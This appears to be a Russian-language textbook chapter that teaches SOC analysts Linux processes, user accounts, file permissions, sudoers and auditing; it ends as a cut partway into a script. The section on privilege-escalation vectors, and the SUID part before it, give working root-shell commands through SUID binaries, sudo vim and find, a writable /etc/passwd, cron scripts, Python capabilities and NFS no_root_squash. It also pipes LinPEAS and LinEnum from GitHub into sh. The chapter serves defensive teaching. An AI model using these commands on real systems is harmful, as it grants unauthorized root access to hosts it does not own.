# Глава 2.3: Процессы, пользователи и права

## Введение

Понимание модели процессов, системы пользователей и механизма прав доступа в Linux — это не просто администраторская рутина. Для специалиста по кибербезопасности это фундамент, без которого невозможно ни обнаружить атаку, ни расследовать инцидент, ни защитить систему. Вредоносное ПО скрывается в процессах. Злоумышленники эскалируют привилегии через неправильно настроенные права. Инсайдеры злоупотребляют доступом к файлам и командам sudo.

В этой главе мы разберём каждый из этих механизмов с точки зрения как администратора, так и аналитика безопасности. Вы узнаете, как читать таблицу процессов в поисках аномалий, как устроены файлы `/etc/passwd` и `/etc/shadow`, что делает SUID-бит опасным и как правильно настраивать `sudoers`, чтобы не открыть дыру в безопасности.

---

## 2.3.1 Управление процессами

### Что такое процесс в Linux

В Linux каждая запущенная программа — это процесс. У каждого процесса есть уникальный идентификатор **PID** (Process ID). Процессы организованы в иерархию: у каждого есть родительский процесс (**PPID** — Parent PID). Корень дерева — процесс `init` (или `systemd`) с PID=1.

С точки зрения безопасности процессы важны по нескольким причинам:
- Каждый процесс выполняется от имени определённого пользователя (UID) и группы (GID)
- Процессы могут наследовать привилегии (SUID)
- Вредоносный код всегда выполняется как процесс — его можно обнаружить

### Команда ps — моментальный снимок процессов

`ps` (process status) выводит список процессов в момент вызова.

```bash
# Показать все процессы всех пользователей в полном формате
ps aux

# Вывод:
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root         1  0.0  0.1 225864  9012 ?        Ss   Feb20   0:03 /sbin/init
# root         2  0.0  0.0      0     0 ?        S    Feb20   0:00 [kthreadd]
# www-data  1234  0.2  1.5 345678 62000 ?        S    10:00   0:12 php-fpm: pool www
# alice     5678  0.0  0.0  21520  3456 pts/0    Ss   11:30   0:00 -bash
```

Расшифровка колонок:
| Колонка | Описание |
|---------|----------|
| USER | Владелец процесса |
| PID | Идентификатор процесса |
| %CPU | Использование процессора |
| %MEM | Использование памяти |
| VSZ | Виртуальная память (КБ) |
| RSS | Физическая память (КБ) |
| TTY | Терминал (? = нет терминала, демон) |
| STAT | Статус процесса |
| START | Время запуска |
| TIME | Суммарное время CPU |
| COMMAND | Команда |

**Статусы процессов (STAT):**

| Код | Значение |
|-----|----------|
| R | Running — выполняется |
| S | Sleeping — ожидает события |
| D | Uninterruptible sleep — ожидает I/O (нельзя прервать) |
| Z | Zombie — завершился, но не убран родителем |
| T | Stopped — остановлен сигналом |
| s | Session leader |
| + | Процесс переднего плана (foreground) |

```bash
# Показать процессы в виде дерева (наглядная иерархия)
ps axjf

# Найти процесс по имени
ps aux | grep nginx

# Показать процессы конкретного пользователя
ps -u www-data

# Вывести определённые поля (полезно для скриптов)
ps -eo pid,ppid,user,stat,cmd --sort=-%cpu | head -20
```

> **Важно для SOC:** При расследовании инцидента всегда обращайте внимание на процессы, у которых:
> - Родитель (PPID) неожиданный (например, bash порождён веб-сервером)
> - Имя похоже на системное, но путь нестандартный (`/tmp/systemd` вместо `/lib/systemd/systemd`)
> - Нет TTY, но запущены интерактивные оболочки
> - Высокое потребление CPU/памяти без видимой причины

```bash
# Поиск подозрительных shell-процессов без TTY (классический признак reverse shell)
ps aux | awk '$7 == "?" && ($11 ~ /bash|sh|zsh|python|perl|ruby/) {print}'

# Найти процессы, запущенные из /tmp или /dev/shm (популярные директории для малвари)
ps aux | grep -E '\/(tmp|dev\/shm|var\/tmp)\/'
```

### Команда top — динамический мониторинг

`top` отображает список процессов в реальном времени, обновляясь каждые несколько секунд.

```bash
top
```

```
top - 14:23:45 up 5 days,  2:17,  2 users,  load average: 0.52, 0.48, 0.45
Tasks: 187 total,   1 running, 186 sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.3 us,  0.8 sy,  0.0 ni, 96.5 id,  0.3 wa,  0.0 hi,  0.1 si
MiB Mem :   3934.5 total,    423.2 free,   2156.8 used,   1354.5 buff/cache
MiB Swap:   2048.0 total,   1987.3 free,     60.7 used.   1513.4 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
 1234 www-data  20   0  345678  62000   8000 S   5.3   1.5   0:12.34 php-fpm
  891 mysql     20   0 1234567 234000  12000 S   2.1   5.8   2:45.67 mysqld
```

Горячие клавиши в `top`:
| Клавиша | Действие |
|---------|----------|
| `M` | Сортировка по памяти |
| `P` | Сортировка по CPU |
| `k` | Завершить процесс (ввести PID) |
| `u` | Фильтр по пользователю |
| `1` | Показать все ядра CPU |
| `c` | Полный путь команды |
| `q` | Выход |

```bash
# Запустить top в пакетном режиме (для скриптов)
top -bn1 | head -20

# Мониторинг конкретного процесса
top -p 1234

# Обновление каждую секунду
top -d 1
```

### htop — улучшенный мониторинг процессов

`htop` — более удобная альтернатива `top` с цветным интерфейсом и дополнительными возможностями. Может потребоваться установка: `apt install htop`.

```bash
htop

# Ключевые возможности:
# - Горизонтальный/вертикальный скролл
# - Дерево процессов (F5)
# - Поиск (F3)
# - Фильтрация (F4)
# - Сортировка по любой колонке (F6)
# - Завершение процесса (F9)
```

### Сигналы и команда kill

Процессы общаются между собой и с ядром через **сигналы**. `kill` отправляет сигнал процессу по его PID.

```bash
# Список всех сигналов
kill -l

# Наиболее важные сигналы:
# SIGTERM (15) - вежливое завершение (процесс может сохранить данные)
# SIGKILL (9)  - принудительное завершение (нельзя перехватить)
# SIGHUP  (1)  - перечитать конфигурацию (часто используется для демонов)
# SIGSTOP (19) - остановить процесс
# SIGCONT (18) - продолжить остановленный процесс

# Завершить процесс вежливо
kill 1234
kill -15 1234
kill -SIGTERM 1234

# Принудительно завершить (когда SIGTERM не помогает)
kill -9 1234
kill -SIGKILL 1234

# Завершить все процессы с данным именем
killall nginx
pkill -f php-fpm

# Отправить сигнал HUP для перезагрузки конфига
kill -HUP $(cat /var/run/nginx.pid)
```

> **Важно:** `SIGKILL` нельзя перехватить или игнорировать — ядро немедленно уничтожает процесс. Это важно при расследовании: вредоносный процесс, перехвативший SIGTERM, всё равно будет убит SIGKILL. Однако при принудительном убийстве артефакты в памяти (ключи шифрования, сетевые соединения) будут потеряны.

```bash
# Найти и убить процесс по имени (осторожно!)
pkill -9 malware

# Убить все дочерние процессы группы
kill -9 -PGID

# Найти PID по порту (полезно при расследовании)
fuser 4444/tcp
lsof -i :4444
```

### Приоритеты процессов: nice и renice

Планировщик Linux назначает каждому процессу приоритет. **Nice value** (-20 до +19): чем меньше значение, тем выше приоритет.

```bash
# Запустить процесс с пониженным приоритетом (не мешать другим)
nice -n 19 backup.sh

# Запустить с повышенным приоритетом (только root)
nice -n -10 critical-task

# Изменить приоритет запущенного процесса
renice -n 10 -p 1234        # Для конкретного PID
renice -n 5 -u www-data     # Для всех процессов пользователя

# Проверить текущий nice value
ps -o pid,ni,cmd -p 1234
```

С точки зрения безопасности: вредоносное ПО иногда устанавливает себе очень низкий nice (высокий приоритет), чтобы получить больше ресурсов CPU для майнинга или брутфорса.

### systemctl — управление службами

В современных дистрибутивах (Ubuntu 16+, CentOS 7+, Debian 8+) `systemd` является системой инициализации. `systemctl` — основной инструмент управления.

```bash
# Статус службы
systemctl status nginx
systemctl status ssh

# Запуск, остановка, перезапуск
systemctl start nginx
systemctl stop nginx
systemctl restart nginx
systemctl reload nginx   # Перезагрузить конфигурацию без остановки

# Включить/отключить автозапуск
systemctl enable nginx
systemctl disable nginx

# Список всех запущенных служб
systemctl list-units --type=service --state=running

# Список всех служб (включая остановленные)
systemctl list-units --type=service --all

# Посмотреть журнал конкретной службы
journalctl -u nginx
journalctl -u nginx -f        # В режиме реального времени
journalctl -u nginx --since "1 hour ago"
```

> **Важно для SOC:** Злоумышленники часто регистрируют вредоносный код как systemd-службу для обеспечения персистентности. Регулярно проверяйте список включённых служб и их файлы юнитов.

```bash
# Найти все пользовательские (нестандартные) службы
systemctl list-unit-files --type=service | grep enabled

# Проверить файл юнита подозрительной службы
systemctl cat suspicious-service

# Где хранятся пользовательские юниты:
ls /etc/systemd/system/
ls /usr/local/lib/systemd/system/

# Найти недавно изменённые юниты (признак установки малвари)
find /etc/systemd/system/ -mtime -7 -name "*.service"
```

---

## 2.3.2 Управление пользователями и группами

### Модель пользователей в Linux

В Linux каждый пользователь идентифицируется числовым **UID** (User ID), каждая группа — **GID** (Group ID). Каждый файл и процесс принадлежит пользователю и группе.

Специальные UID:
- **UID 0** — root (суперпользователь, полный контроль)
- **UID 1-999** — системные пользователи (демоны, службы)
- **UID 1000+** — обычные пользователи

### Файл /etc/passwd

Главная база пользователей системы. Читать его может любой пользователь — это важно знать.

```bash
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice Smith,,,:/home/alice:/bin/bash
bob:x:1001:1001:Bob Jones,,,:/home/bob:/bin/bash
```

Формат записи (7 полей через `:`):
```
username:password:UID:GID:GECOS:home_dir:shell
```

| Поле | Описание |
|------|----------|
| username | Имя пользователя |
| password | `x` — хэш в `/etc/shadow`; `-` — нет пароля |
| UID | Числовой идентификатор |
| GID | Основная группа |
| GECOS | Комментарий (полное имя и т.д.) |
| home_dir | Домашний каталог |
| shell | Оболочка входа |

```bash
# Найти всех пользователей с UID 0 (должен быть только root!)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Найти пользователей с интерактивной оболочкой
awk -F: '$7 !~ /nologin|false/ {print $1, $7}' /etc/passwd

# Найти пользователей без домашнего каталога
awk -F: '$6 == "/" || $6 == "" {print $1}' /etc/passwd
```

> **Красный флаг:** Если в `/etc/passwd` есть пользователь с UID=0, отличный от root, — это признак компрометации системы. Злоумышленники создают скрытых суперпользователей.

### Файл /etc/shadow

Хэши паролей хранятся в `/etc/shadow`, который доступен только root. Это обеспечивает защиту от офлайн-атак перебора паролей.

```bash
sudo cat /etc/shadow
```

```
root:$6$rounds=5000$salt123$hash....:18900:0:99999:7:::
alice:$6$rounds=5000$randomsalt$longhash....:19200:0:99999:7:::
bob:!:19100:0:99999:7:::
locked_user:!$6$hash...:19000:0:99999:7:::
```

Формат записи (9 полей):
```
username:hashed_password:lastchg:min:max:warn:inactive:expire:reserved
```

| Поле | Описание |
|------|----------|
| username | Имя пользователя |
| hashed_password | Хэш пароля (или `!`/`*` — заблокирован) |
| lastchg | Дней с эпохи Unix до последней смены пароля |
| min | Минимальный возраст пароля (дней) |
| max | Максимальный возраст пароля (дней) |
| warn | За сколько дней предупреждать |
| inactive | Дней неактивности до блокировки |
| expire | Дата истечения аккаунта |

Форматы хэшей паролей:
```
$1$  - MD5 (устаревший, небезопасный)
$5$  - SHA-256
$6$  - SHA-512 (рекомендуется)
$y$  - yescrypt (современный)
!    - аккаунт заблокирован (password lock)
*    - вход невозможен
```

```bash
# Найти аккаунты без пароля (пустой хэш — критическая уязвимость!)
sudo awk -F: '($2 == "" || $2 == " ") {print $1 " has no password!"}' /etc/shadow

# Найти аккаунты с устаревшим алгоритмом MD5
sudo awk -F: '$2 ~ /^\$1\$/ {print $1 " uses weak MD5 hash!"}' /etc/shadow

# Проверить срок действия паролей
sudo chage -l alice
```

### Файл /etc/group

```bash
cat /etc/group
```

```
root:x:0:
sudo:x:27:alice
docker:x:999:alice,bob
www-data:x:33:
developers:x:1001:alice,bob,carol
```

Формат: `group_name:password:GID:member_list`

```bash
# Найти пользователей в группе sudo (имеют право на sudo)
grep "^sudo:" /etc/group

# Найти всех членов группы docker (docker = root-эквивалент!)
grep "^docker:" /etc/group

# Показать все группы пользователя
groups alice
id alice
```

> **Важно:** Членство в группе `docker` фактически эквивалентно правам root, поскольку через Docker можно монтировать файловую систему хоста. Это классический вектор эскалации привилегий.

### Команды управления пользователями

#### useradd — создание пользователей

```bash
# Создать пользователя с домашней директорией и оболочкой
useradd -m -s /bin/bash -c "Service Account" serviceaccount

# Создать системного пользователя (нет домашней директории, нет входа)
useradd -r -s /usr/sbin/nologin -c "Web Server" webservice

# Создать пользователя в определённых группах
useradd -m -s /bin/bash -G sudo,developers newadmin

# Параметры useradd:
# -m  создать домашнюю директорию
# -s  оболочка
# -c  комментарий (GECOS)
# -G  дополнительные группы
# -u  указать UID
# -g  основная группа
# -r  системный пользователь
# -e  дата истечения (YYYY-MM-DD)
```

#### usermod — изменение пользователей

```bash
# Добавить пользователя в группу
usermod -aG docker alice
usermod -aG sudo alice

# ВНИМАНИЕ: -G без -a перезапишет все группы!
# usermod -G sudo alice  <- заменит все группы на sudo!

# Изменить оболочку
usermod -s /bin/bash alice
usermod -s /usr/sbin/nologin compromised_user

# Заблокировать аккаунт
usermod -L alice
passwd -l alice

# Разблокировать
usermod -U alice
passwd -u alice

# Изменить домашнюю директорию
usermod -d /new/home -m alice

# Переименовать пользователя
usermod -l newname oldname
```

#### userdel — удаление пользователей

```bash
# Удалить пользователя (сохранить домашнюю директорию)
userdel alice

# Удалить пользователя вместе с домашней директорией
userdel -r alice

# При расследовании инцидента: НЕ удаляйте пользователя сразу!
# Сначала заблокируйте, сохраните артефакты, потом удаляйте
usermod -L compromised_user
usermod -s /usr/sbin/nologin compromised_user
tar czf /forensics/home_backup.tar.gz /home/compromised_user
```

#### passwd — управление паролями

```bash
# Сменить собственный пароль
passwd

# Сменить пароль другого пользователя (root)
passwd alice

# Заблокировать аккаунт
passwd -l alice

# Разблокировать аккаунт
passwd -u alice

# Принудить к смене пароля при следующем входе
passwd -e alice
chage -d 0 alice

# Установить срок действия пароля
chage -M 90 alice     # Максимум 90 дней
chage -m 7 alice      # Минимум 7 дней
chage -W 14 alice     # Предупреждать за 14 дней
chage -l alice        # Показать настройки
```

### Управление группами

```bash
# Создать группу
groupadd developers
groupadd -g 2000 security    # Указать GID

# Удалить группу
groupdel developers

# Изменить группу
groupmod -n newname oldname   # Переименовать
groupmod -g 2001 developers   # Изменить GID

# Проверить группы пользователя
id alice
groups alice
```

---

## 2.3.3 Права доступа к файлам

### Базовые права: chmod

Каждый файл в Linux имеет три набора прав для трёх категорий субъектов:

```
-rwxr-xr--  1  alice  developers  4096  Feb 20  file.sh
 ^^^  ^^^  ^^^
 |    |    |
 |    |    Права остальных (others)
 |    Права группы (group)
 Права владельца (owner)
```

Символы прав:
| Символ | Файл | Директория |
|--------|------|------------|
| `r` (4) | Читать содержимое | Просматривать список файлов |
| `w` (2) | Изменять содержимое | Создавать/удалять файлы |
| `x` (1) | Выполнять | Входить в директорию (cd) |
| `-` (0) | Нет права | Нет права |

```bash
# Символьный режим
chmod u+x script.sh           # Добавить execute для владельца
chmod g-w sensitive.conf      # Убрать write для группы
chmod o-rwx private/          # Убрать все права для остальных
chmod a+r public.txt          # Добавить read для всех (a = all)
chmod u=rwx,g=rx,o= file.sh  # Установить точные права

# Числовой (восьмеричный) режим
chmod 755 script.sh    # rwxr-xr-x
chmod 644 config.txt   # rw-r--r--
chmod 600 private.key  # rw-------
chmod 700 secret/      # rwx------
chmod 777 dangerous/   # rwxrwxrwx - ОПАСНО!

# Рекурсивное изменение
chmod -R 755 /var/www/html
chmod -R 600 /etc/ssl/private/

# Таблица частых значений:
# 400 - Только чтение владельцем (SSH ключи)
# 600 - Чтение и запись только владельцем
# 644 - Чтение+запись владельцем, чтение остальными
# 700 - Все права только владельцу
# 755 - Все права владельцу, чтение+выполнение остальным
# 777 - Все права всем (ОПАСНО!)
```

### Изменение владельца: chown и chgrp

```bash
# Изменить владельца файла
chown alice file.txt
chown alice:developers file.txt   # Владелец и группа

# Изменить только группу
chgrp developers file.txt
chown :developers file.txt

# Рекурсивно
chown -R www-data:www-data /var/www/html
chown -R alice:alice /home/alice/

# Посмотреть права
ls -la /etc/shadow
# -rw-r----- 1 root shadow 1234 Feb 20 /etc/shadow
```

### Специальные биты: SUID, SGID, Sticky Bit

Это наиболее важная часть с точки зрения безопасности.

#### SUID (Set User ID) — бит 4000

Когда на исполняемом файле установлен SUID, процесс выполняется с правами **владельца файла**, а не запустившего пользователя.

```bash
# Классический пример - passwd
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 Mar 14 passwd
#    ^
#    s вместо x = SUID установлен

# Обычный пользователь может изменить свой пароль,
# хотя /etc/shadow принадлежит root - именно благодаря SUID
```

Как злоупотребляют SUID:

```bash
# ПОИСК SUID-ФАЙЛОВ (обязательная проверка при аудите!)
find / -perm -4000 -type f 2>/dev/null

# Типичный вывод:
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/su
# /usr/bin/newgrp
# /usr/bin/chsh
# /usr/bin/pkexec
# /bin/ping
# ... и потенциально опасные:
# /tmp/backdoor   <- КРАСНЫЙ ФЛАГ!
# /usr/local/bin/customtool  <- Требует проверки
```

**Эксплуатация SUID через GTFOBins** — если SUID установлен на неожиданный бинарник:

```bash
# Если find имеет SUID (пример эскалации привилегий)
# Злоумышленник может выполнить:
find . -exec /bin/sh -p \; -quit
# Получает root shell!

# Если vim имеет SUID:
vim -c ':!/bin/sh'

# Если python3 имеет SUID:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Если cp имеет SUID (очень опасно!):
# Можно скопировать /etc/passwd, добавить пользователя с UID=0, скопировать обратно
```

```bash
# Установить SUID (только root)
chmod u+s /usr/local/bin/program
chmod 4755 /usr/local/bin/program

# Убрать SUID
chmod u-s /usr/local/bin/program
chmod 0755 /usr/local/bin/program

# Если SUID на директории — S (заглавная) = execute не установлен
ls -la /some/dir
# drwsr-xr-x  <- SUID+execute
# drwSr-xr-x  <- SUID без execute (аномалия)
```

#### SGID (Set Group ID) — бит 2000

Похож на SUID, но применяется к группе. На директориях имеет другой смысл: новые файлы наследуют группу директории.

```bash
# Поиск SGID-файлов
find / -perm -2000 -type f 2>/dev/null

# SGID на директории - новые файлы получают группу директории
mkdir /shared/project
chown :developers /shared/project
chmod g+s /shared/project
# ls -la покажет: drwxrwsr-x

# Теперь все файлы в /shared/project будут иметь группу developers,
# даже если их создаёт пользователь другой основной группы
```

#### Sticky Bit — бит 1000

На директории sticky bit позволяет удалять файлы только их владельцу (или root), даже если у других есть write на директорию.

```bash
# Классический пример - /tmp
ls -la /
# drwxrwxrwt  ... tmp
#          ^
#          t = sticky bit + execute
#          T = sticky bit без execute

# Любой может создать файл в /tmp, но удалить — только свой файл

# Установить sticky bit
chmod +t /shared/directory
chmod 1777 /shared/directory

# Поиск world-writable директорий БЕЗ sticky bit (уязвимость!)
find / -type d -perm -0002 ! -perm -1000 2>/dev/null
```

### Расширенные атрибуты файлов: lsattr и chattr

```bash
# Просмотр атрибутов
lsattr /etc/passwd
# ----i--------e-- /etc/passwd
# i = immutable (неизменяемый даже для root!)

# Установить immutable (хорошая защита критических файлов)
chattr +i /etc/passwd
chattr +i /etc/shadow

# Убрать immutable
chattr -i /etc/passwd

# Атрибут a = append only (только добавление, не изменение)
chattr +a /var/log/auth.log

# Ключевые атрибуты:
# i - immutable
# a - append only
# e - extent mapping (не устанавливается вручную)
# s - secure deletion (перезапись нулями при удалении)
```

> **Важно для SOC:** Злоумышленники, получившие root, иногда устанавливают `chattr +i` на свои файлы, чтобы защитить их от удаления. Если вы не можете удалить файл как root — проверьте атрибуты через `lsattr`.

---

## 2.3.4 sudo и настройка sudoers

### Принцип работы sudo

`sudo` (superuser do) позволяет выполнять команды от имени другого пользователя (обычно root) без знания его пароля. Это предпочтительный метод предоставления привилегий по сравнению с прямым входом под root.

```bash
# Выполнить команду от root
sudo apt update

# Выполнить команду от другого пользователя
sudo -u www-data ls /var/www

# Открыть root shell
sudo -i
sudo -s
sudo bash

# Проверить доступные sudo-команды
sudo -l

# Пример вывода sudo -l:
# Matching Defaults entries for alice on server:
#     env_reset, mail_badpass, secure_path=...
#
# User alice may run the following commands on server:
#     (ALL : ALL) ALL
```

### Файл /etc/sudoers

**Никогда не редактируйте `/etc/sudoers` напрямую!** Используйте `visudo` — оно проверяет синтаксис перед сохранением. Синтаксическая ошибка в sudoers может заблокировать доступ к sudo.

```bash
# Правильный способ редактирования
visudo

# Или для файлов в /etc/sudoers.d/
visudo -f /etc/sudoers.d/developers
```

Синтаксис sudoers:

```
# Базовый синтаксис:
# WHO  WHERE=(AS_WHOM)  WHAT

# Разрешить alice всё
alice ALL=(ALL:ALL) ALL

# Разрешить группе sudo всё
%sudo ALL=(ALL:ALL) ALL

# Разрешить без пароля (NOPASSWD)
alice ALL=(ALL) NOPASSWD: ALL          # ОПАСНО!
alice ALL=(ALL) NOPASSWD: /usr/bin/apt # Только apt

# Разрешить конкретные команды
alice server1=(root) /sbin/service nginx restart, /sbin/service nginx status

# Псевдонимы для упрощения
User_Alias WEBADMINS = alice, bob, carol
Cmnd_Alias WEBCOMMANDS = /usr/sbin/nginx, /usr/bin/systemctl restart nginx
Host_Alias WEBSERVERS = 192.168.1.10, 192.168.1.11

WEBADMINS WEBSERVERS=(root) WEBCOMMANDS
```

> **Важно:** `NOPASSWD: ALL` — одна из самых опасных конфигураций. Злоумышленник, скомпрометировавший аккаунт с такими правами, немедленно получает root без необходимости знать какой-либо пароль.

### Директория /etc/sudoers.d/

Вместо редактирования основного файла, добавляйте отдельные файлы для каждой роли:

```bash
# Создать файл правил для разработчиков
visudo -f /etc/sudoers.d/developers

# Содержимое файла:
%developers ALL=(root) /usr/bin/systemctl restart apache2, \
                       /usr/bin/systemctl reload apache2, \
                       /usr/bin/tail -f /var/log/apache2/*.log

# Создать файл для мониторинга
visudo -f /etc/sudoers.d/monitoring

# Содержимое:
nagios ALL=(root) NOPASSWD: /usr/lib/nagios/plugins/*, \
                             /usr/sbin/iptables -L
```

### Логирование sudo

Все вызовы sudo записываются в системный журнал:

```bash
# Ubuntu/Debian - в auth.log
grep "sudo" /var/log/auth.log

# Примеры записей:
# Feb 20 14:23:01 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ;
#   USER=root ; COMMAND=/usr/bin/apt update
# Feb 20 14:23:45 server sudo: mallory : 3 incorrect password attempts ;
#   TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash

# Поиск неудачных попыток sudo
grep "sudo.*incorrect" /var/log/auth.log

# Поиск sudo -i (попытки получить root shell)
grep "sudo.*bash\|sudo.*-i\|sudo.*-s" /var/log/auth.log

# CentOS/RHEL - в /var/log/secure
grep "sudo" /var/log/secure
```

---

## 2.3.5 Векторы эскалации привилегий

Это раздел критически важен для понимания того, что ищут злоумышленники после получения первоначального доступа.

### Категории уязвимостей

#### 1. Опасные SUID-бинарники

```bash
# Полная проверка SUID-файлов с верификацией
find / -perm -4000 -type f 2>/dev/null | while read file; do
    owner=$(stat -c "%U" "$file")
    echo "[SUID] $file (owner: $owner)"
done

# Сравнить с базовым списком (занести в baseline при установке системы!)
# Любой файл не из базового списка - красный флаг

# Опасные SUID-бинарники (GTFOBins):
# find, vim, nano, less, more, awk, python, perl, ruby, lua
# cp, mv, bash, sh, nmap (старые версии), tcpdump
# gcc, make (могут компилировать shell)
```

#### 2. Неправильно настроенный sudo

```bash
# Проверить sudo-права текущего пользователя
sudo -l

# Уязвимые конфигурации:
# (ALL) NOPASSWD: ALL                    <- полный root
# (ALL) NOPASSWD: /usr/bin/find          <- легкая эскалация
# (ALL) NOPASSWD: /usr/bin/vim           <- vim может запускать shell
# (ALL) NOPASSWD: /usr/bin/python*       <- python может запускать shell
# (ALL) NOPASSWD: /bin/cp                <- можно скопировать /etc/passwd
# (ALL) NOPASSWD: /usr/bin/tee           <- можно записать в /etc/passwd

# Пример эксплуатации sudo vim:
# sudo vim /etc/hosts
# Внутри vim: :!/bin/bash
# Результат: root shell!

# Пример эксплуатации sudo find:
# sudo find / -exec /bin/bash \;
```

#### 3. Writeable /etc/passwd

```bash
# Проверка прав на критические файлы
ls -la /etc/passwd /etc/shadow /etc/sudoers

# Если /etc/passwd writeable (катастрофа!):
# Добавить пользователя с UID=0 без пароля:
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # Получаем root!

# Сгенерировать хэш пароля и добавить пользователя:
openssl passwd -1 -salt salt password123
# Добавить: hacker:$1$salt$hash:0:0:root:/root:/bin/bash
```

#### 4. Cronjobs с небезопасными путями

```bash
# Проверить все cronjobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
sudo crontab -l

# Пример уязвимого cronjob:
# */5 * * * * root /opt/scripts/backup.sh
# Если /opt/scripts/backup.sh writeable пользователем:
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh
# Через 5 минут /bin/bash получает SUID, и:
bash -p  # root shell!

# Уязвимость PATH в crontab:
# PATH=/home/alice:/usr/local/sbin:...
# Если в /home/alice можно положить файл с именем системной утилиты
```

#### 5. Уязвимые capabilities

```bash
# Capabilities - более тонкий механизм, чем SUID
# Позволяет давать конкретные привилегии без полного root

# Поиск файлов с capabilities
getcap -r / 2>/dev/null

# Пример вывода:
# /usr/bin/ping cap_net_raw=ep
# /usr/bin/python3.9 cap_setuid=ep   <- ОПАСНО! Эскалация через Python!

# Эксплуатация cap_setuid на python:
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### 6. NFS с no_root_squash

```bash
# Проверить экспорты NFS
cat /etc/exports
showmount -e localhost

# Уязвимая конфигурация:
# /shared *(rw,no_root_squash)
# no_root_squash = root на клиенте = root на сервере

# Эксплуатация:
# На клиенте (имея root):
# mount server:/shared /mnt
# cp /bin/bash /mnt/bash
# chmod +s /mnt/bash  <- SUID установится от root сервера!
# На сервере: /shared/bash -p  -> root shell
```

### Инструменты автоматической проверки

```bash
# LinPEAS - автоматическая проверка эскалации привилегий
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# pspy - мониторинг процессов без root (видит cron jobs)
./pspy64

# Ручная проверка (минимальный чеклист):
echo "=== SUID Files ===" && find / -perm -4000 -type f 2>/dev/null
echo "=== SGID Files ===" && find / -perm -2000 -type f 2>/dev/null
echo "=== Sudo Rights ===" && sudo -l
echo "=== Cron Jobs ===" && cat /etc/crontab
echo "=== World-Writable ===" && find / -perm -0002 -type f 2>/dev/null | grep -v proc
echo "=== UID 0 Users ===" && awk -F: '$3==0{print $1}' /etc/passwd
echo "=== Capabilities ===" && getcap -r / 2>/dev/null
```

---

## 2.3.6 Практика для SOC-аналитика

### Скрипт аудита прав и пользователей

```bash
#!/bin/bash
# Скрипт аудита безопасности пользователей и прав
# Использование: sudo bash user_audit.sh

OUTPUT_DIR="/tmp/audit_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Начинаем аудит безопасности..."
echo "[*] Результаты: $OUTPUT_DIR"

# 1. Аудит пользователей
echo "=== Аудит пользователей ===" | tee "$OUTPUT_DIR/users.txt"

echo "--- Пользователи с UID=0 ---" >> "$OUTPUT_DIR/users.txt"
awk -F: '$3==0{print "[КРИТИЧНО] " $1 " имеет UID=0!"}' /etc/passwd \
    >> "$OUTPUT_DIR/users.txt"

echo "--- Пользователи с интерактивной оболочкой ---" >> "$OUTPUT_DIR/users.txt"
awk -F: '$7 ~ /bash|sh|zsh|fish/ {print $1 ": " $7}' /etc/passwd \
    >> "$OUTPUT_DIR/users.txt"

echo "--- Аккаунты без пароля ---" >> "$OUTPUT_DIR/users.txt"
sudo awk -F: '($2 == "" || $2 == " ") {print "[КРИТИЧНО] " $1 " - нет пароля!"}' \
    /etc/shadow >> "$OUTPUT_DIR/users.txt"

echo "--- Аккаунты с MD5 хэшем ---" >> "$OUTPUT_DIR/users.txt"
sudo awk -F: '$2 ~ /^\$1\$/ {print "[ПРЕДУПРЕЖДЕНИЕ] " $1 " - слабый MD5 хэш"}' \
    /etc/shadow >> "$OUTPUT_DIR/users.txt"

# 2. Аудит SUID/SGID
echo "=== Файлы с SUID ===" | tee "$OUTPUT_DIR/suid.txt"
find / -perm -4000 -type f 2>/dev/null | while read f; do
    stat --format="[SUID] %n (owner: %U, size: %s)" "$f"
done >> "$OUTPUT_DIR/suid.txt"

echo "=== Файлы с SGID ===" | tee -a "$OUTPUT_DIR/suid.txt"
find / -perm -2000 -type f 2>/dev/null >> "$OUTPUT_DIR/suid.txt"

# 3. Аудит sudo
echo "=== Конфигурация sudo ===" | tee "$OUTPUT_DIR/sudo.txt"
cat /etc/sudoers >> "$OUTPUT_DIR/sudo.txt"
ls -la /etc/sudoers.d/ >> "$OUTPUT_DIR/sudo.txt"
for f in /etc/sudoers.d/*; do
    echo "--- $f ---" >> "$OUTPUT_DIR/sudo.txt"
    cat "$f" >> "$OUTPUT_DIR/sudo.txt"
done

# 4. Членство в привилегированных группах
echo "=== Привилегированные группы ===" | tee "$OUTPUT_DIR/groups.txt"
for group in sudo root wheel docker lxd disk; do
    members=$(grep "^$group:" /etc/group | cut -d: -f4)
    if [ -n "$members" ]; then
        echo "Группа '$group': $members" >> "$OUTPUT_DIR/groups.txt"
    fi
done

# 5. Аудит capabilities
echo "=== Файлы с capabilities ===" | tee "$OUTPUT_DIR/caps.txt"
getcap -r / 2>/dev/null >> "$OUTPUT_DIR/caps.txt"

# 6. World-writable файлы
echo "=== World-writable файлы (не в /proc, /sys) ===" | tee "$OUTPUT_DIR/worldwrite.txt"
find / -perm -0002 -type f 2>/dev/null \
    | grep -v "^/proc\|^/sys\|^/dev" \
    >> "$OUTPUT_DIR/worldwrite.txt"

echo "[*] Аудит завершён. Проверьте: $OUTPUT_DIR"
ls -la "$OUTPUT_DIR"
```

### Анализ подозрительных процессов

```bash
#!/bin/bash
# Поиск аномальных процессов
# Запускать периодически или при подозрении на компрометацию

echo "=== АНАЛИЗ ПРОЦЕССОВ ==="
echo "Время: $(date)"
echo ""

